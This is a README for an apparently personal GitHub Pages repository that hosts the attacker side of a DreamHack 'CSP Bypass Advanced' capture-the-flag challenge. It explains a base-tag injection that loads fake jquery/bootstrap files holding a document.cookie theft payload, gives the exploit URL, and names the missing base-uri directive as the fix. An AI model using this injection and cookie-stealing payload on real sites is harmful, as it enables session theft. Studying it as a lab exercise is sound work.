# x41cafe.github.io - DreamHack CSP Bypass Advanced Exploit Server

## Overview

This GitHub Pages repository serves as a hosting server for exploiting the "CSP Bypass Advanced" challenge from DreamHack. The exploit demonstrates how a base tag can be used to bypass CSP (Content Security Policy) nonce restrictions.

## Challenge Details

### Vulnerability Analysis

The target application has the following CSP policy:
```
script-src 'self' 'nonce-{random_nonce}'
```

However, the CSP does NOT restrict the `base-uri`, which is a critical oversight. This allows attackers to change the base URL resolution using the `<base>` tag.

### Directory Structure

```
x41cafe.github.io/
└── static/js/
    ├── jquery.min.js       (Malicious payload)
    └── bootstrap.min.js    (Malicious payload)
```

## Exploit Mechanism

### How Base Tag Works

1. The target page loads jQuery and Bootstrap from relative paths:
   ```html
   <script src="/static/js/jquery.min.js"></script>
   <script src="/static/js/bootstrap.min.js"></script>
   ```

2. By injecting a `<base>` tag, we redirect the base URL:
   ```html
   <base href="https://x41cafe.github.io/">
   ```

3. Now the relative paths are resolved from our server:
   - `/static/js/jquery.min.js` → `https://x41cafe.github.io/static/js/jquery.min.js`
   - `/static/js/bootstrap.min.js` → `https://x41cafe.github.io/static/js/bootstrap.min.js`

### Payload

Both JavaScript files contain the same payload:
```javascript
location.href = "/memo?memo=" + document.cookie;
```

This payload:
1. Extracts the flag cookie using `document.cookie`
2. Redirects to the `/memo` page with the cookie as a query parameter
3. The flag is then visible in the `/memo` page response

## Usage

### Step 1: Craft the Exploit Link

The vulnerability is in a `vuln` parameter that accepts HTML input:

```
http://host.dreamhack.io:PORT/vuln?param=<base href="https://x41cafe.github.io/">
```

### Step 2: Trigger the Exploit

When the victim visits the malicious link:
1. The `<base>` tag is inserted into the page
2. The page loads jQuery and Bootstrap from this repository
3. The payload executes automatically
4. The flag cookie is stolen and sent to `/memo`

### Step 3: Extract the Flag

Access the `/flag` page which displays the submitted flag cookie.

## Key Points

- **CSP Nonce Bypass**: The nonce protects inline scripts but doesn't affect external script loading redirected via base tag
- **base-uri Missing**: The absence of `base-uri` restriction is the root cause
- **GitHub Pages Hosting**: This repository acts as the attacker-controlled server
- **Relative Path Resolution**: The browser's path resolution mechanism is exploited

## Mitigation

To prevent this attack, the CSP should include:
```
script-src 'self' 'nonce-{nonce}';
base-uri 'none';
```

The `base-uri 'none'` directive prevents any document from changing the base URL.

## References

- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: HTML base element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)
- [DreamHack](https://dreamhack.io/)

## Author

x41cafe
